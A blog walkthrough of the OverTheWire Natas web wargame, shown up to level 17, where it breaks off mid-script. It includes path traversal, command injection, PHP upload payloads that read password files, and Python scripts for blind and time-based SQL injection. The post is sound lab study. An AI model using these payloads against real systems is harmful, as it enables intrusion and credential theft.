<!DOCTYPE html>
<html><head>
<title>OverTheWire: Natas</title>




<meta charset="utf-8">
<meta name="X-UA-Compatible" content="IE=edge">
<meta name="google-site-verification" content="">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<meta content="telephone=no" name="format-detection">
<meta name="description" content="">
<meta name="renderer" content="webkit">
<meta name="theme-color" content="#ffffff">











<script async src="https://www.googletagmanager.com/gtag/js?id=G-GGX6B7CJG5"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-GGX6B7CJG5', { 'anonymize_ip': false });
}
</script>







  




<link rel="icon" href="https://github.com/koolaidxk1d.png">



      <script src="/js/toc.js"></script>
    
    <link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">

<link rel="stylesheet" href="/scss/dark-mode.min.8639175447dba9c4492e41267341943ef380ff56cf71923d2496213542d91fc5.css" integrity="sha256-hjkXVEfbqcRJLkEmc0GUPvOA/1bPcZI9JJYhNULZH8U=" media="screen">


<link rel="stylesheet"
          href="https://fonts.googleapis.com/css?family=Material+Icons">



















</head>
<body>
    	<div id="app"><div class="single-column-drawer-container" id="drawer"
     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
    <div class="drawer-content">
        <div class="drawer-menu">
            
            
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/posts/links">
                    Cool Links
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/posts/snippets">
                    Snippets
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/posts/infographics">
                    Infographics
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/posts/about">
                    About Me
                </a>
                
            
            
            <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#level-0" class="nav-level-0">
									Level 0
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-1" class="nav-level-1">
									Level 1
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-2" class="nav-level-2">
									Level 2
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-3" class="nav-level-3">
									Level 3
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-4" class="nav-level-4">
									Level 4
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-5" class="nav-level-5">
									Level 5
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-6" class="nav-level-6">
									Level 6
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-7" class="nav-level-7">
									Level 7
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-8" class="nav-level-8">
									Level 8
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-9" class="nav-level-9">
									Level 9
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-10" class="nav-level-10">
									Level 10
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-11" class="nav-level-11">
									Level 11
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-12" class="nav-level-12">
									Level 12
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-13" class="nav-level-13">
									Level 13
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-14" class="nav-level-14">
									Level 14
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-15" class="nav-level-15">
									Level 15
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-16" class="nav-level-16">
									Level 16
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-17" class="nav-level-17">
									Level 17
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-18" class="nav-level-18">
									Level 18
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-19" class="nav-level-19">
									Level 19
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-20" class="nav-level-20">
									Level 20
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
            
        </div>
    </div>
</div>
<transition name="fade">
    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
</transition>
<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
    <div id="navBackground" class="nav-background"></div>
    <div class="container container-narrow nav-content">
        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
            <i class="material-icons">
                menu
            </i>
        </button>
        <a id="navTitle" class="navbar-brand" href="https://koolaidxk1d.github.io/">
            koolaidxk1d
        </a>
        
        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
            <i class="material-icons" id="darkModeToggleIcon2">
                dark_mode
            </i>
        </button>
        
    </div>
</nav>
<div class="single-column-header-container" id="pageHead"
     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
    <a href="https://koolaidxk1d.github.io/">
        <div class="single-column-header-title">koolaidxk1d</div>
        

    </a>
</div>

            <div id="content">
                <div id="streamContainer" class="stream-container">

    <div class="post-list-container post-list-container-shadow">
        <div class="post">
            
            
            
                
            

            <div class="post-head-wrapper"
                
                    
                    
                    style="background-image: url('https://koolaidxk1d.github.io/images/natas.jpg')"
                    
                
            >
                <div class="post-title">
                    OverTheWire: Natas
                    
                    <div class="post-meta">
                        
                        <time itemprop="datePublished">
                            2023-06-21 18:16
                        </time>
                        

                        

                        
                        
                    </div>
                </div>
            </div>
            
            <div class="post-body-wrapper">
                
                <div class="post-body" v-pre>
                
                    <p>Back for more password hunting! This time we are doing a more web-oriented wargame. Similarly to leviathan, no hints are given on the webpage. This game provides no SSH access; everything is done in the browser.</p>
<p>I&rsquo;m lacking in web-dev knowledge to say the least, so this will be quite challenging.</p>
<hr>
<h2 id="level-0">Level 0</h2>
<p>The password is right in your face the moment you look at the html.</p>
<p><img src="/images/natas0-0.png" alt=""></p>
<hr>
<h2 id="level-1">Level 1</h2>
<p>Same story as level 0, however the workaround is just using the hotkey to open the inspector.
<img src="/images/natas1-0.png" alt=""></p>
<hr>
<h2 id="level-2">Level 2</h2>
<p><img src="/images/natas2-0.png" alt=""></p>
<p>On this level, i can see a png file in the html. I decided to download it. I figured the password might be in the exif data, or perhaps in the raw bytes of the file itself.</p>
<p>No dice&hellip;</p>
<p>Then I thought that maybe I just needed to hash the contents of the file&hellip;.however the previous passwords were 32 char alphanumeric. To my knowledge that doesn&rsquo;t follow the format of any hashing algorithms.</p>
<p>I wracked my brain for way too long before I realized that the file was in the <strong>files/ subdirectory</strong>. I felt like a total idiot when I realized.</p>
<p><img src="/images/natas2-1.png" alt=""></p>
<p>Inside users.txt was the password I sought.</p>
<hr>
<h2 id="level-3">Level 3</h2>
<p>I was stumped on this one for a while, until I thought harder about the comment in the html.</p>
<p><img src="/images/natas3-0.png" alt=""></p>
<p>&ldquo;Not even Google will find it&rdquo;.</p>
<p>When Google indexes your website, you can prevent it from crawling certain directories by specifying them in a file called &ldquo;robots.txt&rdquo;. Because of the very concept of this file, it must be publicly available. We can therefore access it by typing it into the url bar.</p>
<p><img src="/images/natas3-1.png" alt=""></p>
<p>Let&rsquo;s navigate there.</p>
<p><img src="/images/natas3-2.png" alt="">
Once again, the pass is inside the txt.</p>
<hr>
<h2 id="level-4">Level 4</h2>
<p>This level seems to be picky about the place from where I was linked to the website.</p>
<p><img src="/images/natas4-0.png" alt=""></p>
<p>There is an HTTP header included in GET requests that specifies the &ldquo;referrer&rdquo;. I believe we will have to spoof this to appear as though we are coming from natas5. I couldn&rsquo;t find a way to do this natively in the inspector, as the referrer header is greyed out and cannot be edited. I decided to use this firefox extension:</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/referercontrol/">https://addons.mozilla.org/en-US/firefox/addon/referercontrol/</a></p>
<p>Once I spoofed the referrer header I was given the password.</p>
<p><img src="/images/natas4-1.png" alt=""></p>
<hr>
<h2 id="level-5">Level 5</h2>
<p>&ldquo;Access disallowed. You are not logged in.&rdquo;</p>
<p>Well&hellip;we are logged in using the password from the last level, but it seems there is another layer of access control on this level.</p>
<p>My first instinct is to check the cookies.</p>
<p><img src="/images/natas5-0.png" alt=""></p>
<p>I set that to 1 and refreshed. Lo and behold, the password appeared.</p>
<hr>
<h2 id="level-6">Level 6</h2>
<p>A text box labeled &ldquo;Input secret: &quot; and a submit button. The source code is available for this level. Let&rsquo;s take a look.</p>
<p><img src="/images/natas6-0.png" alt=""></p>
<p>If we look at the beginning of the php section, we can see that a file at &ldquo;includes/secret.inc&rdquo; is included in the file, which is likely where the secret is stored.</p>
<p>If we type that after the url we can direct the browser to the file.</p>
<p><img src="/images/natas6-1.png" alt=""></p>
<p>Copy the secret into the form and it returns the password to the next level.</p>
<hr>
<h2 id="level-7">Level 7</h2>
<p>We have two links to different pages on the site. Opening the inspector gives us an interesting hint in the form of an html comment.</p>
<p><img src="/images/natas7-0.png" alt=""></p>
<p>It seems to want us to traverse to /etc/natas_webpass/ (where every user&rsquo;s password resides).</p>
<p>In the url we can see that a url parameter is used called page. It likely refers to the filename of the page we are visiting. It may be possible to use &ldquo;../&rdquo; to go up a directory and get us to the file we want.</p>
<p>We can briefly test this by entering it once as the value. Now we get a warning shown:</p>
<p><img src="/images/natas7-1.png" alt=""></p>
<p>This is actually a good thing, because we can see that it is indeed taking us to different places within the filesystem. Additionally, since this warning is so verbose, we can see where we are. Using this information, we can easily format the url as follows to get to the password:</p>
<p><code>http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8</code></p>
<p><img src="/images/natas7-2.png" alt=""></p>
<hr>
<h2 id="level-8">Level 8</h2>
<p>Once again, a level is asking for a secret input. The source code is provided.</p>
<p>In the source code, we can see the contents of the secret:</p>
<p><img src="levels/natas8-0.png" alt=""></p>
<p>We can see the exact formula used to create the encoded secret. Following the nested operations, we should first convert the hex to its binary representation, then reverse it, and finally base64 decode it. We can do all of this very quickly and easily with <a href="https://gchq.github.io/CyberChef/">CyberChef</a>.</p>
<p><img src="/images/natas8-1.png" alt=""></p>
<p>Entering the output gets us the password to level 9.</p>
<hr>
<h2 id="level-9">Level 9</h2>
<p>A search box allows us to search for a word in an unknown set of data. The site displays the search results under &ldquo;Output:&rdquo;.</p>
<p><img src="/images/natas9-0.png" alt=""></p>
<p>In the source code we can see that the script is using passthru() to run linux commands on the system and direct stdout to the page.</p>
<p><img src="/images/natas9-1.png" alt=""></p>
<p>Any time a user-facing input has direct access to run commands on the system, it should be inspected for possibility of exploitation. In this case, we can easily use some special shell characters to run our own commands.</p>
<p>Take a look at <a href="https://book.hacktricks.xyz/pentesting-web/command-injection#command-injection-execution">command injection overview</a> to see how just a few of these special characters work. I am going to make $key equal to <code>. &lt; /etc/natas_webpass/natas10 #</code>. So the entire command executed will now be <code>grep -i . &lt; /etc/natas_webpass/natas10 # dictionary.txt</code>.
The dot tells grep to print indiscriminately. The (&lt;) tells grep to get the data to search from the file mentioned afterward. The (#) is a character used to comment out the rest of the line; since we cannot remove the &ldquo;dictionary.txt&rdquo; part, we just comment it out.</p>
<p>Inputting our new $key string gives us the contents of the password file.</p>
<hr>
<h2 id="level-10">Level 10</h2>
<p>Looks like we have the same challenge again, except some characters are filtered out of the input.</p>
<p><img src="/images/natas10-0.png" alt=""></p>
<p>Let&rsquo;s check and see which characters are not allowed.</p>
<p><img src="/images/natas10-1.png" alt=""></p>
<p>&ldquo;preg_match()&rdquo; is a function which uses regex. As you can see it is checking for &ldquo;/[;|&amp;]/&rdquo;. In regex terms, it is actually just looking for &ldquo;;&rdquo;, &ldquo;|&rdquo;,  or &ldquo;&amp;&rdquo;. I did not use any of those in my solution so I can just reuse the previous solution (changing the filename obviously).</p>
<hr>
<h2 id="level-11">Level 11</h2>
<p>This is where this warbox starts to get challenging for me. The goal of this level seems to be to change the data cookie to the proper value so that the password will be revealed. The problem is that the cookie is XOR encrypted.</p>
<p><img src="/images/natas11-0.png" alt=""></p>
<p>The page first checks if a saved cookie already exists. If it does, make sure that it is authentically encrypted with the XOR key. If it is, then load the values for background color and whether to show the password. If it is inauthentic, it will be rejected and the default &ldquo;showpassword&rdquo; value (&ldquo;no&rdquo;) will be used.</p>
<p>So we obviously need to somehow create a json key-value pair with showpassword set to &ldquo;yes&rdquo; and encrypt it and place it into our cookies. But how can we encrypt without knowing the key?</p>
<p><a href="https://www.101computing.net/xor-encryption-algorithm/">XOR encryption</a> is a larger topic which I will not write about, but to sum up the information relevant to this level I will point out that knowing the ciphertext and plaintext can actually make getting the key extremely simple.</p>
<p>If C is the ciphertext, P is the plaintext, and K is the key, then we can say the following:</p>
<p>C XOR P = K
P XOR K = C
C XOR K = P</p>
<p>Great, so in our case what are the ciphertext and plaintext? Well, the plaintext would be the json encoding of $defaultdata, and the ciphertext would be found in our cookies! The ciphertext is base64 encoded as per the source code, so we first need to decode that.</p>
<pre tabindex="0"><code>P: {&#34;showpassword&#34;: &#34;no&#34;, &#34;bgcolor&#34;: &#34;#ffffff&#34;}
C: 0l;$$98-8=?#9*jvi &#39;ngl*+(!$#9lrnh(.*-(.n6
</code></pre><p>To XOR these together I simply stole the source code, set the $key value to our plaintext, and called the xor_encrypt() function on the ciphertext. I ran it using a PHP interpreter and echoed the result.</p>
<p><img src="/images/natas11-1.png" alt=""></p>
<p>The repeating characters are the key. &ldquo;KNHL&rdquo;. Now that we have the XOR key, all we have to do is encode our own cookie and place it in to the browser. I will once again use the source code to do this, but this time placing our key into $key, placing the modified json pair into the argument of xor_encrypt(), and running base64_encode on the result.</p>
<p><img src="/images/natas11-2.png" alt=""></p>
<p>To actually use our new cookie, we just need to replace the data cookie with our new value and refresh the page.</p>
<p><img src="/images/natas11-3.png" alt=""></p>
<hr>
<h2 id="level-12">Level 12</h2>
<p>This level allows a file upload up to 1KB. It specifies that it needs to be a JPEG.</p>
<p>At first glance, the best exploitation would probably be to somehow upload a PHP file instead of a JPEG to allow for remote code execution. First let&rsquo;s just upload a blank php file to see if input validation measures are in place.</p>
<p><img src="/images/natas12-0.jpg" alt="">
<img src="/images/natas12-1.jpg" alt=""></p>
<p>Weird. The upload works, but the extension is changed to jpg. The source code is linked so let&rsquo;s dig in.</p>
<p><img src="/images/natas12-2.jpg" alt=""></p>
<p>The extension is defined by the input tag named &ldquo;filename&rdquo; in the form. We can directly edit the extension since it is declared explicitly in the html. Doing this before uploading the file will allow PHP uploads.</p>
<p>Now that we bypassed the extension, we need to write a PHP script that will read out the password file to the screen. To run linux commands on the server we can use the passthru PHP function.</p>
<p>Here is a simple script that will read the password file to the screen.</p>
<pre tabindex="0"><code>&lt;?php
	echo(passthru(&#34;cat /etc/natas_webpass/natas13&#34;));
?&gt;
</code></pre><hr>
<h2 id="level-13">Level 13</h2>
<p>This level seems to be the same as 12, but with one key difference: the script checks if the file is a legitimate jpeg.</p>
<p><img src="/images/natas13-0.jpg" alt=""></p>
<p>Looking at the source code and comparing it to level 12&rsquo;s, there is now an added conditional. The result of exif_imagetype() is checked before uploading the file. This means we can reuse the same solution from 12 as long as we can somehow make the function see the file as a jpeg.</p>
<p>When a computer handles a file, the way it handles the file is different based on the filetype. The extension of the file is not the only thing that determines the filetype, and usually it is not even what the computer looks at to determine its compatibility. This is where the <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">file signature</a> comes in.</p>
<p>File signatures, also called magic numbers, are arbitrary (probably) agreed upon combinations of hex bytes typically placed at the very beginning of a file that tell the computer what kind of data a file is storing. This is important because if a program treats a file wrong it can result in unpredictable behavior. The file signature for a jpeg file is 0xFF_D8_FF_DB.</p>
<p>If we want to upload our PHP script and bypass the check, all we need to do is modify the file signature after writing the script. This can be done using any hex editor. Just insert the bytes before the existing contents.</p>
<p><img src="/images/natas13-1.jpg" alt=""></p>
<p>Using this file you can bypass check while still uploading a coherent script for the page to run and return the password to level 14.</p>
<hr>
<h2 id="level-14">Level 14</h2>
<p>This page is asking us to login. It is likely that some type of database is involved considering we are inputting a user and password. Looking at the source code we can see it is using MySQL.</p>
<p><code>$query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot; and password=\&quot;&quot;.$_REQUEST[&quot;password&quot;].&quot;\&quot;&quot;;</code></p>
<p>The query gets the username and password from the form. We can actually format our response to include SQL phrases. This is called <a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#LineCommentAttacks">SQL Injection</a>. I will use a comment (#) to ignore the rest of the query. By doing so, I can specify a username without needing to match the password. In other words, I can override the original query to instead print out the details of the user of my choosing. The user I will enter is natas15. The input should then look like this:</p>
<p><code>natas&quot;#</code></p>
<p><img src="/images/natas14-0.jpg" alt=""></p>
<hr>
<h2 id="level-15">Level 15</h2>
<p>This level took me&hellip;<em>a while</em>; I spent so long staring at its source code trying to find a hole that wasn&rsquo;t there. Eventually, I realized that it was staring back at me the whole time. Let me explain.</p>
<p>Level 15 contains a search box asking for a username. When you enter it and submit the form, you have three possible responses: &ldquo;user exists&rdquo;, &ldquo;user does not exist&rdquo;, and &ldquo;error in request&rdquo;. There is an optional &ldquo;debug&rdquo; feature which can be activated by adding an extra input to the form and making a GET request rather than a POST. Below is the source code:</p>
<p><img src="/images/natas15-0.jpg" alt=""></p>
<h5 id="reconnaissance">Reconnaissance:</h5>
<ul>
<li>The table used on the mySQL database is presumably a table containing the columns &ldquo;username&rdquo; and &ldquo;password&rdquo; according to the source code comment.</li>
<li>Checking the user &ldquo;natas16&rdquo; on the form shows us that it is on the table, so we can probably assume the password is in the password column of the table. This means we likely don&rsquo;t need to somehow get the /etc/password file from the server, but rather we can get it solely by interfacing with the mySQL database.</li>
<li>You can only get 3 possible responses from the submission.</li>
<li>If we don&rsquo;t count the error response, we are essentially getting yes or no answers to our questions.</li>
<li>After a quick test input (&rdquo; AND 1=1#), I can see the form is not protected against SQL injection, so that is still on the table.</li>
<li>If we check the length of the password value using SQL function LENGTH(password) we get 32. That is the same length as every other level&rsquo;s password, so it is definitely in the table.</li>
</ul>
<p>With the given information, it&rsquo;s highly probable that I will have to find a way to return the password using SQL injection and interpreting binary responses in a way that tells us the password. The obvious answer here is char-by-char guessing.</p>
<p>Each character of the password is alphanumeric, so each char has 62 possible values. If we multiply this by 32 characters in the password, we get 1,984. In other words, we only need to make 1,984 requests to the database. My testing shows that an average response from the server takes about a third of a second. So we can reasonably get the entire password in just a few minutes. So how do we actually go about guessing the letters? I&rsquo;ve written a python script to do just that.</p>
<pre tabindex="0"><code>import requests

url = &#34;http://natas15.natas.labs.overthewire.org&#34;
credentials = (&#34;natas15&#34;, &#34;{censored}&#34;)
form_data = {&#34;username&#34;: &#34;x&#34;}
password=&#34;&#34;

alphanumeric_chars = [
&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;,
&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;,
&#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;,
&#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,
&#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;,
&#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;,
&#39;y&#39;, &#39;z&#39;
]

for i in range(1, 33):
  for j in alphanumeric_chars:
    form_data[&#34;username&#34;] = f&#34;natas16\&#34; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)}#&#34;
    
	# Make the cURL request
	
	response = requests.post(url, auth=credentials, data=form_data)
	
	if &#34;exists&#34; in response.text:
	  password += j

	print(f&#34;Current guess: {i}{j}:&#34;)
	print(&#34;Status code:&#34;, response.status_code)
	print(&#34;Content:&#34;, response.text)
	print(&#34;--------------------&#34;)
	print(f&#34;password: {password}&#34;)
	if &#34;exists&#34; in response.text:
      break
</code></pre><p>My concept is a two-dimensional loop. On the outside, iterating over the chars of the string (1-32) and, inside of that, iterating over possible values for those chars(a-z, A-Z, 0-9).</p>
<p>On each iteration, I make a curl request to the site using the credentials and include a variable value for the &ldquo;username&rdquo; input depending on the current iteration. The form data contains SQL injection code in the username field. Then if a char is correct (meaning: the request response contains the word &ldquo;exists&rdquo;) then the char is appended to an undeclared password string variable and we break out of the loop to avoid guessing more chars that we know will be false.</p>
<p>My SQL command given to the &ldquo;username&rdquo; field looks like this:
<code>natas16&quot; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)}#</code></p>
<p>I&rsquo;ve input natas16&quot; to avoid an error, and then added the rest which compares the guess to the actual char of the password at the index defined by the current iteration.</p>
<p>When I ran the script I got the password in a few minutes.</p>
<p><img src="/images/natas15-1.gif" alt=""></p>
<hr>
<h2 id="level-16">Level 16</h2>
<p>Natas16 is revisiting the search form that executes grep which we found in 9 and 10. This time even more characters are filtered. To be precise, we can no longer use the following characters:</p>
<p>; | &amp; ` &rsquo; &quot;</p>
<p>and our input is placed in this PHP statement:</p>
<p><code>passthru(&quot;grep -i \&quot;{input here}\&quot; dictionary.txt);</code></p>
<p>This makes things quite a bit more challenging. After <em>extensive</em> efforts, I can not find a way to escape the double quotes and override the execution of grep. This means we will have to find some way to do everything within the context of grepping the dictionary file.</p>
<p><em>Great.</em></p>
<p>Luckily the dollar-sign and parentheses are not filtered, so we can use command substitution. Command substitution allows you to execute command x within command y to use x&rsquo;s output as an argument (or even just part of an argument) to command y. For example:</p>
<p><code>echo $(echo hello)</code> effectively runs as <code>echo hello</code></p>
<p>Since the output of this page is just pattern matches of the dictionary file, we have to find a way to manipulate that mechanism to reflect information about the password.</p>
<p><img src="/images/natas16-0.png" alt=""></p>
<p>First I will try to determine the individual letters of the password. The dictionary does not have digits in it, so that part will have to wait. Also, the grep flag -i is in use, which tells grep to ignore case. That means we will also have to find a way to determine which letters are uppercase.</p>
<p>A standard Linux utility called &ldquo;cut&rdquo; will help us with figuring out the letters. using command substitution, we can run <code>$(cut -c (number) /etc/natas_webpass/natas17)</code> inside the double quotes of the command to only show words of the dictionary that contain the letter specified. For example, in the following picture, we can see that the first letter of the password must be &lsquo;x&rsquo;.</p>
<p><img src="/images/natas16-1.png" alt=""></p>
<p>Repeating this for all 32 characters gives us:</p>
<blockquote>
<p>xkeuche-sbnkbvh-ru-ksib-uulmi-sd</p>
</blockquote>
<p>The hyphens are just arbitrary marks I placed when the output was blank. In other words, they must be numbers. Speaking of numbers, we now have to determine the numerical characters of the password&hellip;</p>
<p>One way we can use numbers in our grep search is with regex (Regular expressions). Instead of searching for particular spelling-based matches, we can search for lines of particular lengths. So If we use a regex formula that will find lines of length &lsquo;a&rsquo;, and we replace &lsquo;a&rsquo; with the specific char of the password (once again, using the &lsquo;cut&rsquo; command), then we should be able to tell what the number is based on the lengths of the lines in the output.</p>
<p>Therefore, we shall use the following command:</p>
<p><code>^.\{$(cut -c (number) /etc/natas_webpass/natas17)\}\$</code></p>
<p>This is not a regex write-up, so I will not get too off-topic. Basically, the string above will look for lines of a particular length, and that length is filled in using a command substitution that returns the character at the desired index of the given file.</p>
<p>The result looks like this:</p>
<p><img src="/images/natas16-2.png" alt=""></p>
<p>After running this on all of our missing numbers, we now have even more information about the password.</p>
<blockquote>
<p>xkeuche0sbnkbvh1ru7ksib9uulmi7sd</p>
</blockquote>
<p>All we have to do now is determine the case of each character. This is especially tough because of the -i flag I mentioned earlier. We cannot return uppercase dictionary entries to show whether the chars are uppercase, because our searches will always ignore case.</p>
<p>The way I have found to approach this is using our own grep search (for each alphabetical character) which does two case-sensitive searches against the char itself&ndash;once for lowercase and once for uppercase. The result of the search will be blank if there is no match, and if there is a match then the result will be the char we searched. When applied to the dictionary search form, this means that if it is the correct case guess, the dictionary will only show words of that letter. If The guess is incorrect, then the dictionary will receive a blank search pattern (which will match all words in the dictionary). So we can clearly see through the response whether a char is uppercase.</p>
<p>If this is confusing, I&rsquo;ve made a terrible mspaint drawing to try to explain better. Observe.</p>
<p><img src="/images/natas16-3.png" alt=""></p>
<p>The only problem with this is that grep can only work on files. I also tried using &laquo;&lt; to have the char act as an input to grep, but for some strange reason I cannot get that to work. Whatever shell is used on the server seems to ignore it, despite the less-than sign not being explicitly filtered in the source code. No problem, we can just make a script to create a bunch of files on the server containing the chars. We have write access to the /tmp/ directory, so I&rsquo;ve used the following script:</p>
<pre tabindex="0"><code>import requests

url = &#34;http://natas16.natas.labs.overthewire.org&#34;
credentials = (&#34;natas16&#34;, &#34;{censored}&#34;)
form_data = {&#34;needle&#34;: &#34;x&#34;}

for i in range(1,33):
    form_data[&#34;needle&#34;] = f&#34;$(echo $(cut -c {i} /etc/natas_webpass/natas17) &gt; /tmp/char{i})&#34;

        # Make the cURL request

    response = requests.post(url, auth=credentials, data=form_data)

    print(&#34;Status code:&#34;, response.status_code)
    print(&#34;Content:&#34;, response.text)
</code></pre><p>The end result is a bunch of files named &ldquo;char&rsquo;x&rsquo;&rdquo; where x is the index of the string. Each file contains the char found at the corresponding index. Now we can use those files as input to grep.</p>
<p>Again, it&rsquo;s much faster to use a script than to manually run our grep command twice for each alpha char (50-60 times!). I&rsquo;ve written this script which will run our new grep command in the form and pause on each guess to allow me to see the output and judge whether there was a match and write down the correct case of the char.</p>
<pre tabindex="0"><code>import requests

url = &#34;http://natas16.natas.labs.overthewire.org&#34;
credentials = (&#34;natas16&#34;, &#34;{censored}&#34;)
form_data = {&#34;needle&#34;: &#34;x&#34;}

password = &#34;xkeuche0sbnkbvh1ru7ksib9uulmi7sd&#34;

for i in range(1,33):
    form_data[&#34;needle&#34;] = f&#34;$(grep -o {password[i-1]} /tmp/char{i})&#34;

    response = requests.post(url, auth=credentials, data=form_data)

    print(&#34;Status code:&#34;, response.status_code)
    print(&#34;Content:&#34;, response.text)
    print(f&#34;current guess: {password[i-1]}&#34;)
    wait = input()

    form_data[&#34;needle&#34;] = f&#34;$(grep -o {password[i-1].upper()} /tmp/char{i})&#34;

    response = requests.post(url, auth=credentials, data=form_data)

    print(&#34;Status code:&#34;, response.status_code)
    print(&#34;Content:&#34;, response.text)
    print(f&#34;current guess: {password[i-1].upper()}&#34;)
    wait = input()
</code></pre><p>I will not spoil the final password, but the script did allow me to get the correct case of each char and move on to the next level.</p>
<p>This was the hardest level yet for sure. I kept coming back to it over the course of a couple weeks before I finally figured it out. It&rsquo;s hard to say whether this was even close to the intended solution. I still wonder whether there was a way of escaping the quotes that I overlooked.</p>
<hr>
<h2 id="level-17">Level 17</h2>
<p>This level has the same source code as level 15 except that it no longer let&rsquo;s us know whether the user exists. Effectively this leaves us with no feedback to go on. To get around this, there is a MySQL function called &ldquo;SLEEP()&rdquo; that we can use. The sleep function can be used anywhere you would place a condition such as &ldquo;username=&rdquo;. The time it takes for the response to come back from the server can indicate whether the sleep function was used. So if we order the SQL server to sleep when we make a correct guess (refer to level15 above) then the response time will provide a signal for the script to save that character.</p>
<p>It stands to reason that we can just take the script from Level 15 and tweak it a bit, since the problem is largely the same.</p>
<pre tabindex="0"><code>import time
import requests

url = &#34;http://natas17.natas.labs.overthewire.org&#34;
credentials = (&#34;natas17&#34;, &#34;{censored}&#34;)
form_data = {&#34;username&#34;: &#34;x&#34;}
password=&#34;&#34;

alphanumeric_chars = [
&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;,
&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;,
&#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;,
&#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,
&#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;,
